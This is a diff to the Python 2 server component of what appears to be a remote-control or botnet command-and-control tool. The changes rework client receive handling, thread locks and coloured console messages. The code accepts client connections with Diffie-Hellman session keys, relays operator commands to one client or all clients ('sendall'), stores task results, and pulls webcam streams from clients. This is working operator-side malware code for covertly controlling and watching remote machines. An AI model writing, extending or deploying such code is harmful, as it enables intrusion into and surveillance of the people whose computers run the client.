@@ -329,9 +329,15 @@ class ServerThread(threading.Thread):
         except Exception as e:
             self._error(str(e))
     
-    def recv_client(self, client_id):
+    def recv_client(self, client_id=None):
         if str(client_id).isdigit() and int(client_id) in self.clients:
             client  = self.clients[int(client_id)]
+        elif self.current_client:
+            client  = self.current_client
+        else:
+            self._error('Unable to receive data - Invalid Client ID: {}'.format(client_id))
+            self._return()
+        try:
             buf     = ''
             while '\n' not in buf:
                 try:
@@ -339,10 +345,11 @@ class ServerThread(threading.Thread):
                 except: break
             if len(buf):
                 data = self.decrypt(buf, client.name)
-                return json.loads(data)
-        else:
-            self._error('Invalid Client ID')
-    
+                return json.loads(data, encoding='utf-8')
+            return
+        except Exception as e:
+            self._error("{} returned error: {}".format(self.recv_client.func_name, str(e)))
+
     def get_clients(self):
         return [v for v in self.clients.values()]
 
@@ -356,7 +363,8 @@ class ServerThread(threading.Thread):
                 self.current_client.lock.clear()
             client = self.clients[int(client_id)]
             self.current_client = client
-            self._print('\n\nClient {} selected'.format(client_id))
+            print(colorama.Fore.CYAN + colorama.Style.BRIGHT + "\n\n\t[+] " + colorama.Fore.RESET + colorama.Style.DIM + "Client {} selected\n".format(client.name, client.addr[0]) + self._text_color + self._text_style)
+            self.current_client.lock.set()
             return self.current_client.run()
 
     def background_client(self, client_id=None):
@@ -488,7 +496,6 @@ class ServerThread(threading.Thread):
         print(self._text_color + self._text_style + '    results <id>            ' + colorama.Fore.YELLOW + '|' + self._text_color + ' List task results from database')
         print(self._text_color + self._text_style + '    sendall <command>       ' + colorama.Fore.YELLOW + '|' + self._text_color + ' Send command to all clients')
         print(self._text_color + self._text_style + '    settings <options>      ' + colorama.Fore.YELLOW + '|' + self._text_color + ' Edit color/style settings')
-        print(self._text_color + self._text_style + '    threads                 ' + colorama.Fore.YELLOW + '|' + self._text_color + ' List currently active threads')
         print(colorama.Fore.YELLOW  + colorama.Style.DIM    + '--------------------------------------------------------------------')
         print(self._text_color + self._text_style + '< > = required argument')
         print(self._text_color + self._text_style+ '[ ] = optional argument\n')
@@ -541,7 +548,7 @@ class ServerThread(threading.Thread):
                 cv2.destroyAllWindows()
                 client.lock.set()
         else:
-            self.send_client(args, client.name)
+            self.send_client("webcam %s" % args, client.name)
 
     
     def new_task_id(self, command, client_id=None):
@@ -590,13 +597,13 @@ class ServerThread(threading.Thread):
             name               = self.count
             client             = ClientHandler(connection, addr, name)
             self.clients[name] = client
-            client.connection.setblocking(True)
-            self._print("\nReceived connection from {}\n".format(client.addr[0]))
+            print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "\n\n\t[+] " + colorama.Fore.RESET + colorama.Style.DIM + "Client {} - new connection from {}\n".format(client.name, client.addr[0]) + self._text_color + self._text_style)
             self.count  += 1
             client.start()
+            threads[self.run.func_name] = threading.Thread(target=self._return, name=time.time())
+            threads[self.run.func_name].start()
 
     def run(self):
-        self.lock.set()
         while True:
             try:
                 self.lock.wait()
@@ -633,6 +640,7 @@ class ServerThread(threading.Thread):
         threads[self.run.func_name] = threading.Thread(target=self.run, name=time.time())
         threads[self.connection_handler.func_name].start()
         threads[self.run.func_name].start()
+        self.lock.set()
 
 
 class ClientHandler(threading.Thread):
@@ -649,14 +657,13 @@ class ClientHandler(threading.Thread):
         self.session_key    = self.diffiehellman()
         self.info           = self._info()
         self.id             = self._register()
+        self.connection.setblocking(True)
         
     def _prompt(self, data):
-        return raw_input(threads['server']._prompt_color + threads['server']._prompt_style + bytes(data).rstrip())
+        return raw_input(threads['server']._prompt_color + threads['server']._prompt_style + '\n' + bytes(data).rstrip())
              
     def _error(self, data):
-        self.lock.clear()
         print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Client {} Error: '.format(self.name) + bytes(data) + '\n')
-        self.lock.set()
 
     def _info(self):
         buf  = ''
@@ -673,7 +680,7 @@ class ClientHandler(threading.Thread):
         try:
             return json.loads(data.rstrip())
         except Exception as e3:
-            self._error("Loading data in JSON format failed: {}".format(str(e1)))
+            self._error("Failed to identify client host machine: {}".format(str(e1)))
 
     def _register(self):
         try:
@@ -707,27 +714,28 @@ class ClientHandler(threading.Thread):
     def run(self):
         while True:
             try:
-                self.lock.wait()
-                task = self.prompt if self.prompt else threads['server'].recv_client(self.name)
-                if 'prompt' == task.get('command'):
-                    self.prompt     = task.get('data')
-                    command         = self._prompt(bytes(self.prompt).format(self.name))
-                    cmd, _, action  = bytes(command).partition(' ')
-                    if cmd in threads['server'].commands:
-                        result = threads['server'].commands[cmd](action) if len(action) else threads['server'].commands[cmd]()
-                        if result:
-                            threads['server']._print(result)
-                            threads['server'].save_task_results(task)
-                        continue
-                    else:
-                        threads['server'].send_client(command, self.name)
-                else:
-                    if task.get('data'):
-                        threads['server']._print(task['data'])                      
-                        threads['server'].save_task_results(task)
-                self.prompt = None
                 if threads['server'].exit_status:
                     break
+                self.lock.wait()
+                task = self.prompt if self.prompt else threads['server'].recv_client(self.name)
+                if task:
+                    if 'prompt' == task.get('command'):
+                        self.prompt     = task.get('data')
+                        command         = self._prompt(bytes(self.prompt).format(self.name))
+                        cmd, _, action  = bytes(command).partition(' ')
+                        if cmd in threads['server'].commands:
+                            result = threads['server'].commands[cmd](action) if len(action) else threads['server'].commands[cmd]()
+                            if result:
+                                threads['server']._print(result)
+                                threads['server'].save_task_results(task)
+                            continue
+                        else:
+                            threads['server'].send_client(command, self.name)
+                    else:
+                        if task.get('data'):
+                            threads['server']._print(task['data'])                      
+                            threads['server'].save_task_results(task)
+                self.prompt = None
             except Exception as e:
                 self._error(str(e))
                 break
